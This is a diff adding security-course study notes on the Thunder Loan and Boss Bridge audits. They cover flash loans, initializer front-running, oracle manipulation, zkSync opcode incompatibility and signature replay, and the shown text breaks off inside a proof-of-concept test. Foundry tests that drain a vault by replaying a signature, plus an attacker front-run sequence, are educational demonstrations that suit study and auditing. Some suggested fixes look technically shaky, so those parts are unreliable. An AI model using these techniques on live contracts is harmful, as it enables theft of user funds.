@@ -3994,14 +3994,1560 @@ Cons:
 
 # Thunder Loan
 
+## What is a Flash Loan?
 
+### Why Flash Loans?
+
+The easiest way to understand flash loans may be through an understanding of one of their most common use cases - arbitration.
+
+***What is Arbitrage?\***
+
+Let's consider a typical scenario. Suppose there are two DEXs, A and B. On Dex A, the exchange rate for Ethereum stands at $5, and on Dex B, Ethereum is trading at $6. Savvy investors might be quick to see an opportunity for profit.
+
+You could buy one Ethereum at DEX A for $5, then head over to DEX B and sell that Ethereum for $6. This simple transaction would net you a profit of $1. This process is known as **Arbitrage.**
+
+![what-is-a-flash-loan1](SC-Security-note.assets/what-is-a-flash-loan1.png)
+
+Imagine if this situation were to scale up, and you were able to buy 10, 100 or 1000 ETH. The problem lies in the average person's ability to shoulder the upfront investment.
+
+In contemporary finance, opportunities like I've outlined above could only maximally be taken advantage of by `whales` aka the incredibly wealthy.
+
+This is where flash loans come in to level the playing field in DeFi by giving any user access to much more liquidity - for a single transaction.
+
+### Payback or Revert
+
+So, how does a `flash loan` allow the average user to take advantage of larger scale financial opportunities?
+
+This is a really powerful function of the blockchain and smart contract ecosystem.
+
+In contemporary finance, typically collateral is required to take a loan, some assurance must be made that a loan will be repaid. In Web3, a protocol is able to programmatically assure a loan is repaid.
+
+***How does this work?\***
+
+A smart contract protocol assures that a `flash loan` is repaid effectively by containing logic within its loan functionality that requires the transferred balance be restored to the protocol within the *same transaction* as it's borrowed. If these checks don't pass, the transaction will revert, back to its initial state - as though the loan never took place.
+
+The code for a `flash loan` may be as minimal as:
+
+```solidity
+
+uint256 startingBalance = IERC20(token).balanceOf(address(this));
+assetToken.transferUnderlyingTo(receiverAddress, amount);
+​
+// callback function here
+​
+uint256 endingBalance = token.balanceOf(address(this));
+if (endingBalance < startingBalance + fee) {
+    revert();
+}
+​
+```
+
+Effectively, a user taking a `flash loan` is able to do anything they want between the `transferUnderlyingTo` and the conditional check at the end of this function. This is only possible because if that check on the `endingBalance` doesn't pass, the entire transaction (and anything that was done with the loan) will revert!
+
+![pay-back-or-revert1](SC-Security-note.assets/pay-back-or-revert1.png)
+
+It's easy to see what opportunities a system like `flash loans` enables for the average user. No longer will these advantages be available only to whales!
+
+### Liquidity Providers
+
+A natural question that arises from here is:
+
+***Where do funds for the loan initial come from?\***
+
+The answer is a familiar one - `Liquidity Providers`!
+
+Much like we saw in `TSwap`, where a `Liquidity Provider` would deposit funds into a pool to earn fees, the same takes place with `flash loans`.
+
+A `Liquidity Provider` would deposit funds into a `flash loan` protocol, receiving some form of LP Token representative of their contribution. The `flash loan` protocol then accrues fees as people use `flash loans`, which increases the value of a `Liquidity Provider`'s representative allotment of the pool.
+
+![liquidity-providers1](SC-Security-note.assets/liquidity-providers1-17587078478175.png)
+
+
+
+### Arbitrage Walkthrough
+
+Alright, with a little more context and understanding about flash loans, let's walk through an entire arbitrage process from start to end and see for ourselves how an average user can leverage flash loans to even the playing field in DeFi.
+
+We'll start with a poor, average user who can only afford 1 ETH at $5.
+
+![arbitrage-walkthrough1](SC-Security-note.assets/arbitrage-walkthrough1.png)
+
+His options are pretty limited. How would this look with a flash loan protocol involved?
+
+Steps:
+
+1. User recognizes an arbitrage opportunity between two DEXes.
+2. User executes a flash loan, using these funds to trade between DEXes
+3. User yields a profit of the margin between prices between DEXes
+4. User repays flash loan.
+
+> **Steps 2-4 happen in a single transaction!**
+
+![arbitrage-walkthrough2](SC-Security-note.assets/arbitrage-walkthrough2.png)
+
+Clearly, DeFi systems like flash loans are incredibly powerful when used to level the playing field of financial opportunity in Web3.
+
+## Exploit - Failure to Initialize
+
+With the context of proxies and the use of initializers understood, the first question that always comes to mind for me is:
+
+***Are things being initialized properly?\***
+
+If a protocol fails to initialize a value, it could potentially have dire consequences.
+
+Even though this is technically a vulnerability in ThunderLoan.sol, and we're jumping place a little bit. Let's head there and make a note of things as well as definite what this potential exploit looks line this this code base.
+
+```solidity
+// Audit-Low: Initializer can be front-run
+function initialize(address tswapAddress) external initializer {
+    __Ownable_init(msg.sender);
+    __UUPSUpgradeable_init();
+    __Oracle_init(tswapAddress);
+    s_feePrecision = 1e18;
+    s_flashLoanFee = 3e15; // 0.3% ETH fee
+}
+```
+
+***What's meant by `Initializer can be front-run`?\***
+
+Well, imagine the hypothetical of a user deploying this protocol and forgetting to initialize these attributes, or worse yet, the initialize function is sent to the mempool and an MEV bot initializes first, allowing it to set the tswapAddress to anything they want!
+
+We know that our initializer in `ThunderLoan.sol` is setting the value of our s_poolFactory variable. Let's consider what would happen if this was uninitialized and exploited.
+
+```solidity
+function getPriceInWeth(address token) public view returns (uint256) {
+    address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
+    return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
+}
+```
+
+It can be seen in our `OracleUpgradeable.sol` contract that this variable is being used to determine which pool to call a price feed from. A malicious actor, exploiting the initialize function, could effectively set this price feed to report anything they wanted (or more likely the `getPriceInWeth` function would break entirely)!
+
+### Mitigation
+
+The mitigation for something like a failure to initialize is kinda tough to say. It's reliant on the protocol owners acting in an expected way and assuring things are set appropriately when they should be.
+
+Often I will recommend including the initialization directly in a protocol's deployment scripts to assure this is being called every time.
+
+### Wrap Up
+
+`Failure to initialize` is an easily overlooked attack opportunity unfortunately, and it comes with some wide spread potential consequences. The impact of failing to initialize can be as broad as the types of protocols that exist, but executing best practices such as adding these initializing considerations directly into a deploy script can go a long way towards mitigating potential heartache.
+
+Front-run 攻击解释
+
+**Front-run（抢跑攻击）** 是指攻击者观察到内存池（mempool）中的交易后，通过支付更高的 gas 费用让自己的交易优先执行，从而获得不当利益的攻击方式。
+
+### 代理合约初始化的 Front-run 风险
+
+#### 当前代码分析
+
+```solidity
+function initialize(address tswapAddress) external initializer {
+    __Ownable_init(msg.sender);  // ⚠️ 关键问题：msg.sender 成为 owner
+    __UUPSUpgradeable_init();
+    __Oracle_init(tswapAddress);
+    s_feePrecision = 1e18;
+    s_flashLoanFee = 3e15; // 0.3% ETH fee
+}
+```
+
+🚨 **存在严重的 Front-run 风险！**
+
+#### 攻击场景：
+
+1. **部署阶段**：
+   ```solidity
+   // 1. 部署者部署代理合约
+   ThunderLoanProxy proxy = new ThunderLoanProxy(implementation, "");
+   
+   // 2. 部署者发送初始化交易到 mempool
+   proxy.initialize(tswapAddress);  // 在 mempool 中等待
+   ```
+
+2. **攻击者抢跑**：
+   ```solidity
+   // 攻击者看到 mempool 中的初始化交易
+   // 攻击者用更高的 gas 价格抢先调用
+   proxy.initialize(maliciousAddress);  // 攻击者成为 owner！
+   ```
+
+3. **攻击结果**：
+   - 攻击者成为合约的 `owner`
+   - 攻击者可以调用所有 `onlyOwner` 函数
+   - 攻击者完全控制协议
+
+### 实际影响分析
+
+#### 攻击者获得的权限：
+
+```solidity
+// 攻击者可以执行的恶意操作：
+
+// 1. 添加恶意代币
+function setAllowedToken(IERC20 maliciousToken, bool allowed) external onlyOwner
+
+// 2. 修改手续费（设置为 100%）
+function updateFlashLoanFee(uint256 newFee) external onlyOwner
+
+// 3. 升级合约到恶意实现
+function _authorizeUpgrade(address newImplementation) internal override onlyOwner
+```
+
+### 修复方案
+
+#### 方案 1：构造函数中设置 Owner（推荐）
+
+```solidity
+// 在代理合约部署时就指定 owner
+contract ThunderLoanProxy {
+    constructor(address implementation, address initialOwner, address tswapAddress) {
+        _setImplementation(implementation);
+        ThunderLoan(address(this)).initialize(initialOwner, tswapAddress);
+    }
+}
+
+// 修改 initialize 函数
+function initialize(address initialOwner, address tswapAddress) external initializer {
+    __Ownable_init(initialOwner);  // ✅ 明确指定 owner
+    __UUPSUpgradeable_init();
+    __Oracle_init(tswapAddress);
+    s_feePrecision = 1e18;
+    s_flashLoanFee = 3e15;
+}
+```
+
+#### 方案 2：两阶段初始化
+
+```solidity
+address private s_pendingOwner;
+
+function initialize(address tswapAddress) external initializer {
+    s_pendingOwner = msg.sender;  // 设置待定 owner
+    __UUPSUpgradeable_init();
+    __Oracle_init(tswapAddress);
+    s_feePrecision = 1e18;
+    s_flashLoanFee = 3e15;
+}
+
+function acceptOwnership() external {
+    require(msg.sender == s_pendingOwner, "Not pending owner");
+    __Ownable_init(msg.sender);
+    s_pendingOwner = address(0);
+}
+```
+
+#### 方案 3：使用 CREATE2 + 预计算地址
+
+```solidity
+// 使用 CREATE2 部署，确保只有部署者知道 salt
+bytes32 salt = keccak256(abi.encodePacked(block.timestamp, msg.sender));
+address predictedAddress = Clones.cloneDeterministic(implementation, salt);
+
+// 在同一个交易中部署和初始化
+ThunderLoan(predictedAddress).initialize(tswapAddress);
+```
+
+### OpenZeppelin 的最佳实践
+
+许多项目采用工厂模式来避免这个问题：
+
+```solidity
+contract ThunderLoanFactory {
+    function createThunderLoan(address tswapAddress) external returns (address) {
+        // 在同一交易中部署和初始化，避免 front-run
+        ThunderLoan loan = new ThunderLoan();
+        loan.initialize(msg.sender, tswapAddress);  // msg.sender 是调用者
+        return address(loan);
+    }
+}
+```
+
+### 总结
+
+当前的 `initialize` 函数确实存在严重的 front-run 风险，攻击者可以：
+1. 监控 mempool 中的初始化交易
+2. 用更高 gas 费抢先调用
+3. 成为合约 owner
+4. 完全控制协议
+
+这是一个 **高危漏洞**，需要立即修复。建议采用方案 1，在部署时就明确指定 owner，避免依赖 `msg.sender`。
+
+
+
+## `initializer` 修饰符的作用机制
+
+### 核心功能
+
+`initializer` 修饰符来自 OpenZeppelin 的 `Initializable` 合约，它的主要作用是：
+
+1. **防止重复初始化**：确保初始化函数只能被调用一次
+2. **替代构造函数**：在代理模式中，逻辑合约不能使用构造函数，因为代理合约的存储空间是独立的
+
+### 实现机制
+
+```solidity
+// OpenZeppelin Initializable.sol 的简化版本
+contract Initializable {
+    bool private _initialized;
+    bool private _initializing;
+
+    modifier initializer() {
+        require(!_initialized && !_initializing, "Already initialized");
+        _initializing = true;
+        _;
+        _initializing = false;
+        _initialized = true;
+    }
+}
+```
+
+### ⚠️ `initializer` **没有防止抢跑的机制**
+
+#### 为什么没有防抢跑保护
+
+根据 OpenZeppelin 官方文档，`initializer` 修饰符的设计目标是防止重复初始化，而不是防止抢跑攻击 [1]。它只是简单地检查：
+- 合约是否已经初始化过
+- 是否正在初始化过程中
+
+#### 抢跑攻击仍然可能发生
+
+```solidity
+// 攻击场景演示
+contract VulnerableProxy {
+    function initialize(address owner) external initializer {
+        __Ownable_init(msg.sender); // ❌ 任何人都可以成为第一个调用者
+    }
+}
+
+// 攻击流程：
+// 1. 部署者发送 initialize(legitimateOwner) 到 mempool
+// 2. 攻击者看到交易，发送更高 gas 的 initialize(attackerAddress)
+// 3. 攻击者的交易先执行，成为 owner
+// 4. 部署者的交易失败（因为已经初始化过了）
+```
+
+#### 社区对此问题的讨论
+
+OpenZeppelin 社区论坛中有开发者专门讨论了这个问题。一位开发者询问："代理工厂调用初始化是否存在抢跑风险？"，社区确认了这确实是一个需要注意的安全问题 [3]。
+
+#### 实际案例分析
+
+RAILGUN 项目在使用 OpenZeppelin 的可升级代理时，特别强调了初始化阶段的安全性问题。他们指出虽然 `initializer` 修饰符确保函数只能被调用一次，但这并不能防止恶意行为者抢先调用初始化函数 [2]。
+
+### 防抢跑的解决方案
+
+#### 方案 1：原子化部署和初始化
+
+```solidity
+contract SafeFactory {
+    function deployAndInitialize(
+        address implementation,
+        address intendedOwner,
+        bytes memory initData
+    ) external returns (address proxy) {
+        // 在同一个交易中完成部署和初始化
+        proxy = Clones.clone(implementation);
+        IInitializable(proxy).initialize(intendedOwner, initData);
+        return proxy;
+    }
+}
+```
+
+#### 方案 2：访问控制初始化
+
+```solidity
+contract ProtectedInitializer {
+    address private immutable FACTORY;
+    
+    constructor() {
+        FACTORY = msg.sender; // 记录部署者
+    }
+    
+    function initialize(address owner) external initializer {
+        require(msg.sender == FACTORY, "Only factory can initialize");
+        __Ownable_init(owner);
+    }
+}
+```
+
+#### 方案 3：两阶段初始化
+
+```solidity
+contract TwoPhaseInit {
+    address private s_pendingOwner;
+    bool private s_fullyInitialized;
+    
+    function initialize() external initializer {
+        s_pendingOwner = tx.origin; // 使用交易发起者
+        // 基础初始化...
+    }
+    
+    function finalizeInitialization() external {
+        require(msg.sender == s_pendingOwner, "Unauthorized");
+        require(!s_fullyInitialized, "Already finalized");
+        __Ownable_init(msg.sender);
+        s_fullyInitialized = true;
+    }
+}
+```
+
+### 社区最佳实践建议
+
+对于防止抢跑攻击，OpenZeppelin 社区建议考虑以下策略：
+- 使用私有内存池
+- 实施滑点保护机制  
+- 使用私有 RPC 提供商
+- 在部署时就确定关键参数 [4]
+
+### 总结
+
+**`initializer` 修饰符的局限性：**
+- ✅ 防止重复初始化
+- ✅ 在代理模式中替代构造函数
+- ❌ **不能防止抢跑攻击**
+- ❌ **不提供访问控制**
+
+因此，在设计可升级合约时，开发者必须额外考虑初始化阶段的安全性，不能仅仅依赖 `initializer` 修饰符来保护关键的初始化逻辑。ThunderLoan 合约确实存在被抢跑的风险，需要采用上述解决方案之一来加强安全性。
+
+
+
+
+
+
+
+## Exploit - Oracle Manipulation - Minimized
+
+To glean a better understanding of Oracle Manipulation as a vulnerability and potential exploit, let's take a look at the examples provided in our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo.
+
+All of the images and diagrams for this lesson will be in the [**src/oracle-manipulation**](https://github.com/Cyfrin/sc-exploits-minimized/tree/main/src/oracle-manipulation) directory.
+
+First, let's recall what we've been talking about regarding flash loans. These are equity focuses DeFi systems which allow anyone to leverage more than their own buying power for the duration of a single transaction, for a fee.
+
+![exploit-oracle-manipulation-minimized1](SC-Security-note.assets/exploit-oracle-manipulation-minimized1.png)
+
+We also learnt that this was an amazing tool to facilitate arbitrage, whereby a user can normalize the prizes between Dexs by buying and selling an asset with an identified price difference between them. This has two effects
+
+1. The user makes a profit denoted by the margin between the two listings of the asset
+2. The listed prices of the asset should change as demand and price on each protocol adjusts for the arbitration
+
+![exploit-oracle-manipulation-minimized2](SC-Security-note.assets/exploit-oracle-manipulation-minimized2.png)
+
+Do you see where we're going with this yet?
+
+Flash loans afford the ability to manipulate the prices of assets on Dexs by drastically altering the ratios between trading pairs. This results in any price of an asset reliant on these Dex pairs will be inaccurate!
+
+The impact on Thunder Loan itself is a little harder to see, but let's consider that this would look like in a simpler example.
+
+We know the flash loan receiver needs to be a smart contract with the executeOperation function. It's in this function that the funds are used for the purpose the user borrowed them, what if they were first used to manipulate a Dex price?
+
+![exploit-oracle-manipulation-minimized3](SC-Security-note.assets/exploit-oracle-manipulation-minimized3.png)
+
+
+
+In the diagram above, we can see that an interaction with TSwap is being used to manipulate the price ratio between the two tokens (USDC and WETH). This allows the flash loan receiver to purchase an NFT at a massive WETH discount, ultimately selling it for a profit in USDC.
+
+The profit of course is used to then repay the flashloan.
+
+It's the NFT Protocol's reliance on a Dex like TSwap as an oracle that leads to a vulnerability like this!
+
+> **Note:** The Diagram is simplified, there are other considerations not accounted for such as slippage, the weth spent on the NFT etc, but the concept is the same.
+
+### Wrap Up
+
+This is great high-level overview of the vulnerabilities associated with using Dexs like `TSwap` as a `price oracle`. We're going to see this in action within `ThunderLoan` when we write a PoC to highlight this vulnerability.
+
+Before jumping into the next lesson, I encourage you to take a look at the contracts and examples provided in [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized), for this vulnerability. Oracle Manipulation is a big one, so we *have got to* be familiar with it.
+
+The repo has some fantastic examples and links to Remix, [**Damn Vulnerable DeFi**](https://www.damnvulnerabledefi.xyz/) challenges and even a [**great case study**](https://rekt.news/cream-rekt-2/) pertaining to `oracle manipulation`. Please investigate, stay curious!
+
+![exploit-oracle-manipulation-minimized4](SC-Security-note.assets/exploit-oracle-manipulation-minimized4.png)
 
 
 
 # Boss Bridge
 
+## Boss Bridge Diagram
 
+![boss-bridge-diagram1](SC-Security-note.assets/boss-bridge-diagram1.png)
+
+To begin, `TokenFactory.sol`'s sole purpose is to deploy `L1Token.sol` contracts. Easy.
+
+We can see (start from the top left) that a User on L1 will call the `depositToL2` function on `L1BossBridge.sol`. This tells `Boss Bridge` to lock up a given amount of the user's `L1Tokens` into the `L1Vault`.
+
+As the user's tokens are moved to the `L1Vault` an event is emitted. This tells the `Boss Bridge Signer` that a given amount of tokens have been received and they are free to unlock that amount of tokens from the `L2Vault`. These `Signers` represent that centralized bottleneck that many bridge protocols suffer from. The role is important and impactful and we should be very aware of what they're capable of.
+
+`L2Token` exists as a copy of the L1 asset, on L2.
+
+Tokens from the `L2Vault` are transferred to the User on L2.
+
+The same flow of transactions is generally expected to work in reverse as well, where a user will lock tokens on L2 to unlock them on L1, but this process isn't in the scope of our Boss Bridge review!
+
+## Exploit - Unsupported Opcodes
+
+Something interesting to me in the `TokenFactory::deployToken` is that the Boss Bridge team is using Assembly for some reason. Using low-level code can introduce some easy ways to break a contract that we should be cognizant of.
+
+We go deeper into opcodes in the HorseStore and Math Masters sections of the [**Assembly & Formal Verification Course**](https://updraft.cyfrin.io/courses/formal-verification), don't be discouraged if this bit isn't clear right away.
+
+### deployToken Assembly
+
+So, Assembly gives us lower level access to the EVM. We can see it being used in `TokenFactory::deployToken`.
+
+```solidity
+function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
+    assembly {
+        addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
+    }
+    s_tokenToAddress[symbol] = addr;
+    emit TokenDeployed(symbol, addr);
+}
+```
+
+In Solidity, this Assembly block is actually written in a language called `Yul`, we see it's executing the `create` function.
+
+The [**Solidity Documentation**](https://docs.soliditylang.org/en/latest/yul.html) is a great reference for what these Yul functions are doing.
+
+![unsupported-opcodes1](SC-Security-note.assets/unsupported-opcodes1.png)
+
+What does this mean for our Boss Bridge function?
+
+**v** - `0`
+
+**p** - `add(contractBytecode, 0x20)`
+
+**n** - `mload(contractBytecode)`
+
+Without getting too deep into how things are working, any time you work with data, it tends to need to be loaded into memory. In order to do this, we need to know how big it is, or how much data to load.
+
+Ultimately, our `create` function is taking the size of our contract byte code (`p`), loading it into memory (`n`), and creating the contract based on that data in memory. `v` is the value we're sending with the create transaction.
+
+The create Yul function returns an address, but I'm really not sure why the protocol would choose to deploy this way. We might post the question:
+
+```
+// @Audit-Question: Why are we using Assembly here? Is this gas efficient?
+```
+
+**If your TokenFactory.json file looks like this:**
+
+![unsupported-opcodes3](SC-Security-note.assets/unsupported-opcodes3.png)
+
+**...right-click and select `Format Document`.**
+
+We can scroll down to `bytecode` or `deployedBytecode` for a list of what's used in this contract. This string of numbers and letters is the hexadecimal representation of the opcodes of which this contract is comprised.
+
+Within this list, we expect to find the `create` opcode. A reference list for opcodes can be found here on [**evm.codes**](https://www.evm.codes/). From that reference we can see that `create` is represented by the opcode `F0`.
+
+We can definitely see it popping up, if we search our bytecode for this.. don't worry about it showing up a few time for our purposes here.
+
+![unsupported-opcodes4](SC-Security-note.assets/unsupported-opcodes4.png)
+
+This opcode is of course compatible with the `Ethereum` chain, but Boss Bridge is meant to work on `zkSync Era`! I wonder if the `create` opcode is supported, we should check [**their docs**](https://docs.zksync.io/).
+
+Their docs have a tonne of valuable information that I recommend you read, but we're most interested in `EVM compatibility`. From [**this section**](https://docs.zksync.io/build/support/faq.html#evm-compatibility) of the docs zkSync details:
+
+```markdown
+EVM Compatibility
+
+There is a lot of confusion amongst the community with regard to the impacts of being EVM Compatible versus EVM Equivalent. First, let’s define what is meant by the two.
+
+- EVM Equivalent means that a given protocol supports every opcode of Ethereum’s EVM down to the bytecode. Thus, any EVM smart contract works with 100% assurance out of the box.
+- EVM Compatible means that a percentage of the opcodes of Ethereum’s EVM are supported; thus, a percentage of smart contracts work out of the box.
+
+zkSync is optimized to be EVM compatible not EVM equivalent for three primary reasons:
+
+1. Creating a generalized circuit for EVM equivalence down to the bytecode would be prohibitively expensive and time-consuming.
+2. Building on what we learned with zkSync Lite, we were able to design a system optimized for performance and provability in ZK.
+3. The opcodes we’ve chosen NOT to support are deprecated by Ethereum itself, or rarely used. In the case a project needs them, modifications to work with zkSync are minimal and do not generate a need for a new security audit.
+```
+
+Alright, all good to know, but not exactly what we're looking for. It *does* seem like things are handled somewhat differently on zkSync Era. [**This page**](https://docs.zksync.io/build/developer-reference/differences-with-ethereum.html) has more specific information on how `create` is handled.
+
+```markdown
+"On zkSync Era, contract deployment is performed using the hash of the bytecode, and the factoryDeps field of EIP712 transactions contains the bytecode. The actual deployment occurs by providing the contract's hash to the ContractDeployer system contract.
+
+To guarantee that create/create2 functions operate correctly, the compiler must be aware of the bytecode of the deployed contract in advance. "
+```
+
+![unsupported-opcodes5](SC-Security-note.assets/unsupported-opcodes5.png)
+
+Uh oh. The third example we're given by the zkSync docs looks suspiciously like our `Boss Bridge` execution of `create`!
+
+This is clearly going to be an issue.
+
+```solidity
+assembly {
+    // @Audit-High: This won't work on zkSync Era!
+    // Docs Reference: https://docs.zksync.io/build/developer-reference/differences-with-ethereum.html#create-create2
+    addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
+}
+```
+
+## Signatures Summarized
+
+In a nutshell, this is how signing works:
+
+1. Take a private key + message
+   - The message is generally comprised of: data, function selectors, parameters etc
+2. Pass both the private key + message into the [**Elliptic Curve Digital Signature Algorithm**](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm) (ECDSA)
+   - We don't dive deep into ECDSA, but I recommend you do
+   - outputs `v, r, and s`
+3. `v, r, and s` are used to verify someone's signature using the precompile `ecrecover`.
+
+## Bug Hunting Tips
+
+So, how did `LeonSpacewalker` find this bug, disclose it and get his massive payout? Leon's tips are below:
+
+1. Find your edge: Find the thing that gives you an advantage over other auditors and developers.
+
+2. Find a strategy that works for you: Everyone different and the best approach to finding bugs for one may be different for another. Leon outlined a few good strategies:
+
+   1. Find a project and search for bugs - this includes learning everything there is to know about a protocol, reading it's documentation, building it locally, really mastering the insides and out to identify where things go wrong.
+
+   2. Find a bug and search for projects - Find a bug that's rare or many people are unfamiliar with and look for projects that may be vulnerable to that bug. It can be much easier to look for a specific thing in a code base than to look for something that stands out.
+
+   3. Be fast with new updates: Be signed up to Bug Bounty announcements through platforms like Immunefi to assure you're notified as soon as a bounty is made live by a protocol.
+
+   4. Be creative with finding your edge: Something Leon did to give him an edge was traverse community forums to scope out which protocols were considering doing a bug bounty. He would then proactively look through code based *before* they were even submitted for approval!
+
+   5. Know your tooling: Security researchers use a whole host of tools to their advantage when hunting for bugs including things like
+
+      - Solidity Visual Developer
+      - Hardhat
+      - Etherscan
+      - Foundry
+      - Fuzzing Tools
+      - Test Suites
+
+      ... to name a few. Knowing these tools, their features and how to implement them effectively provide huge advantages when approaching a bug hunt.
+
+   6. **Don't be afraid of audited projects:** Just because a code base has been reviewed ***does not\*** guarantee it's 100% secure. Code bases which have gone through multiple rounds of security reviews may often still be vulnerable to lesser known exploits, and frankly no audit firm is perfect.
+
+   7. **Find your niche:** Find that thing you specialize in and know more about than anyone else. For example, a lot of developers may know Solidity, but not understand the financial side of DeFi. Maybe you want to get really good at borrowing and lending, maybe NFTs. Find something that positions you to be the expert at defending that particular space/industry.
+
+## Exploit - Signature Replay
+
+### Exploit - Signature Replay Introduction
+
+Alright, there seems to be a lot going on in the sendToL1 function, lots of complicated signature stuff. Is there any way we can break this?
+
+```solidity
+function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
+    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
+​
+    if (!signers[signer]) {
+        revert L1BossBridge__Unauthorized();
+    }
+​
+    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
+​
+    (bool success,) = target.call{ value: value }(data);
+    if (!success) {
+        revert L1BossBridge__CallFailed();
+    }
+}
+```
+
+Consider the nature of the blockchain. Any data passed to a transaction is publicly accessible. Once a signed message's v, r and s are made public, on-chain, anyone could execute this transaction, technically.
+
+... What happens if the transaction happens twice?
+
+### Exploit - Signature Replay Minimized
+
+We need to talk about signature reply attacks, because they are painfully common in Web3.
+
+We've got a great hands-on, [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/signature-replay/SignatureReplay.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) in our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo to assist you in better understanding this attack vector. If you want to play with it in Remix, you're encouraged to do so, but I find it easier to bring up the [**SignatureReplayTest.t.sol**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/test/unit/SignatureReplayTest.t.sol) file in the sc-exploits-minimized repo locally.
+
+```solidity
+function test_signatureReplay() public {
+    vm.startPrank(victim.addr);
+    signatureReplay.deposit{value: startingAmount}();
+​
+    // These 3 lines happen off chain
+    bytes32 structHash = keccak256(abi.encode(signatureReplay.TYPEHASH(), withdrawAmount));
+    bytes32 digest = signatureReplay.getHashTypedDataV4(structHash); // This function will prepend the EIP-712 domain separator
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(victim.key, digest);
+​
+    // Victim signs withdrawal of 1 ether, oh no! The signature is loose!
+    // The V, R, and S values are live!
+    signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
+    vm.stopPrank();
+​
+    assertEq(address(signatureReplay).balance, startingAmount - withdrawAmount);
+    assertEq(signatureReplay.balances(victim.addr), startingAmount - withdrawAmount);
+​
+    vm.startPrank(attacker);
+    while (address(signatureReplay).balance >= 1 ether) {
+        signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
+    }
+    vm.stopPrank();
+​
+    assertEq(address(signatureReplay).balance, 0);
+    assertEq(signatureReplay.balances(victim.addr), 0);
+}
+```
+
+In this test, we have a victim depositing funds to a protocol and then signing a transaction with `vm.sign`. The victim then calls `withdrawBySig` which broadcasts the `v, r, and s` values of the victims signature for this message, on-chain.
+
+```solidity
+signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
+```
+
+From here, an attacker sees these values on-chain and decides to call the `withdrawBySig` function with them repeatedly until all funds are removed from the protocol.
+
+Granted, in this example the attacker isn't *stealing* anything, you could see the potential exploits that could arise from this sort of vulnerability.
+
+### Signature Replay PoC
+
+With some context of how a signature replay attack works, we can come back to our sendToL1 function within L1BossBridge.sol and see how it applies to our situation.
+
+```solidity
+function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
+    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);
+​
+    if (!signers[signer]) {
+        revert L1BossBridge__Unauthorized();
+    }
+​
+    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
+​
+    (bool success,) = target.call{ value: value }(data);
+    if (!success) {
+        revert L1BossBridge__CallFailed();
+    }
+}
+```
+
+We can see that there's clearly nothing in place to prevent this broadcast signature from being used more than once. We should write a proof of code to demonstrate this.
+
+Within L1TokenBridge.t.sol:
+
+```solidity
+function testSignatureReplay() public {
+address attacker = makeAddr("attacker");
+// assume the vault already holds some tokens
+uint256 vaultInitialBalance = 1000e18;
+uint256 attackerInitialBalance = 100e18;
+deal(address(token), address(vault), vaultInitialBalance);
+deal(address(token), attacker, attackerInitialBalance);
+​
+// An attacker deposits tokens to L2
+vm.startPrank(attacker);
+token.approve(address(tokenBridge), type(uint256).max);
+tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+​
+// Signer/Operator is going to sign the withdrawal
+bytes memory message = abi.encode(
+    address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+);
+​
+(uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+​
+while(token.balanceOf(address(vault)) > 0){
+    tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+}
+​
+assertEq(token.balanceOf(attacker), attackerInitialBalance + vaultInitialBalance);
+assertEq(token.balanceOf(address(vault)), 0);
+}
+```
+
+Ok, this is a lot of code, let's break down what's happening here so far. We first set up our environment by creating an `attacker` address and assigning some value of our token to both the `attacker` and the `vault`.
+
+```solidity
+address attacker = makeAddr("attacker");
+// assume the vault already holds some tokens
+uint256 vaultInitialBalance = 1000e18;
+uint256 attackerInitialBalance = 100e18;
+deal(address(token), address(vault), vaultInitialBalance);
+deal(address(token), attacker, attackerInitialBalance);
+```
+
+Next, our `attacker` is depositing some tokens into the vault via `depositTokensToL2`.
+
+```solidity
+// An attacker deposits tokens to L2
+vm.startPrank(attacker);
+token.approve(address(tokenBridge), type(uint256).max);
+tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+```
+
+At this point our deposit has been emitted and the off-chain `signer` is now meant to sign the withdraw transaction. The first step to this is hashing the message to be signed.
+
+```solidity
+bytes memory message = abi.encode(
+address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+);
+```
+
+We're going to leverage some Foundry magic by using the Cheatcode `vm.sign` to simulate this signature. We need to pass `vm.sign` a private key and a message. Fortunately, Foundry can help us again.
+
+We're very familiar with the creation of addresses in our Foundry tests, but something we've not really touched on is the creation of accounts. At the very top of `L1TokenBridge.t.sol`, you can see we have an example.
+
+```solidity
+address deployer = makeAddr("deployer");
+address user = makeAddr("user");
+address userInL2 = makeAddr("userInL2");
+Account operator = makeAccount("operator");
+```
+
+Our `operator` variable is an example of an Account object. These objects have 2 properties, `key` and `addr`. Let's use `operator.key` to sign our withdraw transaction.
+
+```solidity
+(uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
